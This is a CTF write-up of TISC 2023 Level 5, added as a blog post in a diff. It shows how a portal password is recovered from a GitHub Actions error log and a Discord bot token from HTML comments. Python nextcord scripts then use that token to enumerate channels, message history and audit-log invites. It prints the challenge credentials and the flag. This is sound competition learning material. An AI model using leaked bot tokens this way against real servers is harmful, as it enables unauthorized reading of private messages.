@@ -1,0 +1,293 @@
+---
+title: TISC 2023 - (Level 5) PALINDROME's Invitation
+date: 2023-10-05 20:00:00 +0800
+categories: [ctf]
+tags: [osint, misc]
+render_with_liquid: false
+image:
+    path: /assets/images/tisc2023/tisc2023.jpg
+---
+## Description
+
+> Valuable intel suggests that PALINDROME has established a secret online chat room for their members to discuss on plans to invade Singapore's cyber space. One of their junior developers accidentally left a repository public, but he was quick enough to remove all the commit history, only leaving some non-classified files behind. One might be able to just dig out some secrets of PALINDROME and get invited to their secret chat room...who knows?  
+>  
+>  Start here: [https://github.com/palindrome-wow/PALINDROME-PORTAL](https://github.com/palindrome-wow/PALINDROME-PORTAL)
+
+## Solution
+
+The link was to a repository hosted on GitHub. 
+
+![](/assets/images/tisc2023/Pasted image 20231001210130.png)
+
+However, it only contained 2 commits and only the `.github/workflows`, which is normally used to hold GitHub Action workflow files.
+
+![](/assets/images/tisc2023/Pasted image 20231001210149.png)
+
+Lets open the only file in this repository.
+
+`test_portal.yml`:
+```yml
+name: Test the PALINDROME portal
+
+on:
+    issues:
+        types: [closed]
+
+jobs:
+  test:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Test the PALINDROME portal
+        run: | 
+          C:\msys64\usr\bin\wget.exe '''${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
+          cat test
+```
+
+This workflow performs a web request to retrieve the contents of the web page and reads it. There was also the use of 2 GitHub Action secrets: `PORTAL_URL` and `PORTAL_PASSWORD`, which could be related to the "secret online chat room" stated in the challenge description.
+
+Moving to the "Actions" tab which shows all previous GitHub Action runs:
+
+![](/assets/images/tisc2023/Pasted image 20231001210448.png)
+
+On this page, there was only one failed run called "Portal opening". In it was a failed step, which had rror logs which revealed something interesting.
+
+![](/assets/images/tisc2023/Pasted image 20231001210516.png)
+
+Based on the workflow file, it can be deduced the following:
+```
+PORTAL_URL = http://chals.tisc23.ctf.sg:45938
+PORTAL_PASSWORD = :dIcH:..uU9gp1<@<3Q"DBM5F<)64S<(01tF(Jj%ATV@$Gl
+```
+
+The web page at `PORTAL_URL` is shown below:
+
+![](/assets/images/tisc2023/Pasted image 20231001210646.png)
+
+After putting the contents of `PORTAL_URL` into the password field, the following page is displayed:
+
+![](/assets/images/tisc2023/Pasted image 20231001210751.png)
+
+After clicking on the "Welcome" link, it is observed that it was an invite to a Discord server called "PALINDROME's secret chat room":
+
+![](/assets/images/tisc2023/Pasted image 20231001211144.png)
+
+After joining the Discord server, the page fails to load any messages:
+
+![](/assets/images/tisc2023/Pasted image 20231001211611.png)
+
+The page also stated that there was a welcome gift from the portal. Viewing the HTML source of the portal, there was a Discord bot token that was commented out:
+
+```html
+<a href="https://discord.gg/2cyZ6zpw7J">Welcome!</a>
+<!-- MTEyNTk4MjIyOTg2OTM4MzgyMQ.GBYnzA.UKONB_ZbyP97Oaz9oE15hNFEfb87ypek9h9tao -->
+<!-- You have 15 minutes before this token expires! Find a way to use it and be fast! You can always re-enter the password to get a new token, but please be considerate, it is highly limited. -->
+```
+
+Using the `nextcord` Python library, the following script was created to utilise the Discord bot token:
+
+`bot.py`:
+```python
+import requests
+import re
+import nextcord
+from nextcord.ext import commands
+
+PORTAL_URL = "http://chals.tisc23.ctf.sg:45938/check"
+PORTAL_PASSWORD = ':dIcH:..uU9gp1<@<3Q"DBM5F<)64S<(01tF(Jj%ATV@$Gl'
+
+def get_token():
+    data = {
+        "password": PORTAL_PASSWORD
+    }
+    contents = requests.post(PORTAL_URL, data=data).text
+    return re.findall(r"<!--(.*?)-->", contents)[0]
+
+def create_bot():
+    client = commands.Bot()
+
+    @client.event
+    async def on_ready():
+        print(f'We have logged in as {client.user}')
+		print(f'Guilds: ${client.guilds}')
+    
+    return client
+    
+def main():
+    token = get_token()
+    client = create_bot()
+    client.run(token)
+
+if __name__ == "__main__":
+    main()      
+```
+
+```bash
+$ python3 bot.py
+We have logged in as PALINDROME's secretary 6#1020
+Guilds: $[<Guild id=1130166064710426674 name="PALINDROME's secret chat room" shard_id=0 chunked=False member_count=120>]
+```
+
+After running it, it is observed that the script successfully logged in as as "PALINDROME's secretary 6" and was a member of the Discord server that has the guild ID `1130166064710426674`.
+
+The script is modified again to view the list of permissions that the Discord bot has:
+
+```python
+def create_bot():
+    client = commands.Bot()
+
+    @client.event
+    async def on_ready():
+        print(f'We have logged in as {client.user}')
+        
+        GUILD_ID = 1130166064710426674
+        guild = client.get_guild(GUILD_ID)
+        
+        member = guild.get_member(client.user.id)
+        permissions_list = [perm for perm, enabled in member.guild_permissions if enabled]
+        print(f"Permissions available: ${permissions_list}")
+    
+    return client
+```
+
+```bash
+$ python3 bot.py
+We have logged in as PALINDROME's secretary 7#7331
+Permissions available: $['view_audit_log', 'read_messages', 'read_message_history']
+```
+
+Based on the output, the Discord bot has the rights to view messages in the Discord server. Hence the script is modified to view the list of text channels that it has access to:
+
+```python
+@client.event
+    async def on_ready():
+        print(f'We have logged in as {client.user}')
+        
+        GUILD_ID = 1130166064710426674
+        guild = client.get_guild(GUILD_ID)
+        
+        channels = guild.text_channels
+        print(channels)
+        
+    return client
+```
+
+```bash
+$ python3 bot.py
+We have logged in as PALINDROME'S secretary 17#0126
+[<TextChannel id=1130166064710426678 name='general' position=0 nsfw=False news=False category_id=1130166064710426676>, <TextChannel id=1132170180101947504 name='meeting-records' position=1 nsfw=False news=False category_id=1132169821623165142>, <TextChannel id=1132170608013226084 name='flag' position=2 nsfw=False news=False category_id=1132169821623165142>]
+```
+
+The Discord bot has access to 3 different text channels, one of which seemed to might hold the flag. To create their contents, the script is modified to print the message history of all 3 channels:
+
+```python
+@client.event
+    async def on_ready():
+        print(f'We have logged in as {client.user}')
+        
+        GUILD_ID = 1130166064710426674
+        guild = client.get_guild(GUILD_ID)
+        
+        channels = guild.text_channels
+        
+        for channel in channels:
+            try:
+                async for message in channel.history(limit=2000):
+                    print(message.content)
+                    if message.flags.has_thread:
+                        async for m in message.thread.history(limit=2000, oldest_first=True):
+                            print("  :", m.content)
+            except:
+                pass
+        
+    return client
+```
+
+```bash
+$ python3 bot.py
+We have logged in as PALINDROME'S secretary 17#0126
+meeting 05072023
+  : Anya: (Excitedly bouncing on her toes) Mama, Mama! Guess what, guess what? I overheard Loid talking to Agent Smithson about a new mission for their spy organization PALINDROME!
+  : Yor: (Smiling warmly) Really, Anya? That's wonderful! Tell me all about it.
+  : Anya: (Whispers) It's something about infiltrating Singapore's cyberspace. They're planning to do something big there!
+  : Yor: (Intrigued) Oh, that sounds like a challenging mission. I'm sure your Papa will handle it well. We'll be cheering him on from the sidelines.
+  : Anya: (Nods) Yeah, but Papa said it's a complicated operation, and they need some special permission with the number '66688' involved. I wonder what that means.
+  : Yor: (Trying not to give too much away) Hmm, '66688,' you say? Well, it's not something I'm familiar with. But I'm sure it must be related to the clearance or authorization they need for this specific task. Spies always use these secret codes to communicate sensitive information.
+  : Anya: (Eager to help) I want to help Papa with this mission, Mama! Can we find out more about it? Maybe there's a clue hidden somewhere in the house!
+  : Yor: (Playing along) Of course, my little spy-in-training! We can look for any clues that might be lying around. But remember, we have to be careful not to interfere with Papa's work directly. He wouldn't want us to get into any trouble.
+  : Anya: (Giggling) Don't worry, Mama, I won't mess up anything. But I really want to be useful!
+  : Yor: (Pats Anya's head affectionately) You already are, Anya. Just by being here and supporting us, you make everything better. Now, let's focus on finding that clue. Maybe it's hidden in one of your favorite places.
+  : Anya: (Eyes lighting up) My room! I'll check there first!
+  : (Anya rushes off to her room, and after a moment, she comes back with a colorful birthday invitation. Notably, the invitation is signed off with: client_id 1076936873106231447)
+  : Anya: (Excitedly) Mama, look what I found! It's an invitation to a secret spy meeting!
+  : Yor: (Pretending to be surprised) Oh, my goodness! That's amazing, Anya. And it's for a secret spy meeting disguised as your birthday party? How cool is that?
+  : Anya: (Giggling) Yeah! Papa must have planned it for me. But, Mama, it's not my birthday yet. Do you think this is part of their mission?
+  : Yor: (Nods knowingly) You might be onto something, Anya. Spies often use such clever tactics to keep their missions covert. Let's keep this invitation safe and see if anything happens closer to your supposed birthday.
+  : Anya: (Feeling important) I'll guard it with my life, Mama! And when the time comes, we'll be ready for whatever secret mission they have planned!
+  : Yor: (Hugging Anya gently) That's the spirit, my little spy. We'll be the best team and support Papa in whatever way we can. But remember, we must keep everything a secret too.
+  : Anya: (Whispering) I promise, Mama. Our lips are sealed!
+  : This entire conversation is fictional and written by ChatGPT.
+```
+
+In one of the text channels was a conversation between 2 persons. There was also a mention of a `client_id` and the value `1076936873106231447`, which seemed to maybe belong to a member on the Discord server. Thus, the script is modified to print the identity of this member:
+
+```python
+@client.event
+    async def on_ready():
+        print(f'We have logged in as {client.user}')
+        
+        GUILD_ID = 1130166064710426674
+        guild = client.get_guild(GUILD_ID)
+        
+        CLIENT_ID = 1076936873106231447
+        print(await client.fetch_user(CLIENT_ID))
+        
+    return client
+```
+
+```bash
+$ python3 bot.py
+We have logged in as PALINDROME's secretary 5#5233
+BetterInvites#0896
+```
+
+BetterInvites was actually a Discord bot, normally used to create special invites associated with certain Discord server roles:
+
+![](/assets/images/tisc2023/Pasted image 20231001223130.png)
+
+To understand what invites were generated by BetterInvites, the script is modified once again to filter the Discord server's audit logs for invite creations and print them:
+
+```python
+@client.event
+    async def on_ready():
+        print(f'We have logged in as {client.user}')
+
+        GUILD_ID = 1130166064710426674
+        guild = client.get_guild(GUILD_ID)
+
+        async for entry in guild.audit_logs(action=nextcord.AuditLogAction.invite_create, limit=10000):
+            print(entry.after)
+```
+
+```bash
+$ python3 bot.py
+We have logged in as PALINDROME'S secretary 17#0126
+<AuditLogDiff code='HQvTm5DSTs' channel=<TextChannel id=1132170608013226084 name='flag' position=2 nsfw=False news=False category_id=1132169821623165142> inviter=<User id=1130165088788168858 name='palindromewow' global_name='PALINDROME' bot=False> uses=0 max_uses=0 max_age=0 temporary=False flags=0>
+<AuditLogDiff code='RBjatqsJ' channel=<TextChannel id=1132170608013226084 name='flag' position=2 nsfw=False news=False category_id=1132169821623165142> inviter=<User id=1130165088788168858 name='palindromewow' global_name='PALINDROME' bot=False> uses=0 max_uses=0 max_age=604800 temporary=False flags=0>
+<AuditLogDiff code='pxbYNkbb' channel=<TextChannel id=1130166064710426678 name='general' position=0 nsfw=False news=False category_id=1130166064710426676> inviter=<User id=1130165088788168858 name='palindromewow' global_name='PALINDROME' bot=False> uses=0 max_uses=0 max_age=604800 temporary=False flags=0>
+<AuditLogDiff code='2cyZ6zpw7J' channel=<TextChannel id=1130166064710426678 name='general' position=0 nsfw=False news=False category_id=1130166064710426676> inviter=<User id=1130165088788168858 name='palindromewow' global_name='PALINDROME' bot=False> uses=0 max_uses=0 max_age=0 temporary=False flags=0>
+<AuditLogDiff code='QB2VRCz3' channel=<TextChannel id=1130166064710426678 name='general' position=0 nsfw=False news=False category_id=1130166064710426676> inviter=<User id=1130165088788168858 name='palindromewow' global_name='PALINDROME' bot=False> uses=0 max_uses=0 max_age=604800 temporary=False flags=0>
+```
+
+For each of the audit log records, there is a `code` field which can be used to construct Discord server invite links. Since there is only a small group of them, each of them can be visited manually until a working invite is found:
+
+![](/assets/images/tisc2023/Pasted image 20231001225950.png)
+
+The invite link was `https://discord.gg/invite/HQvTm5DSTs`. After joining the server again, the message history of the `flag` text channel can been seen:
+
+![](/assets/images/tisc2023/Pasted image 20231001230022.png)
+
+
+## Flag
+
+`TISC{H4ppY_B1rThD4y_4nY4!}`
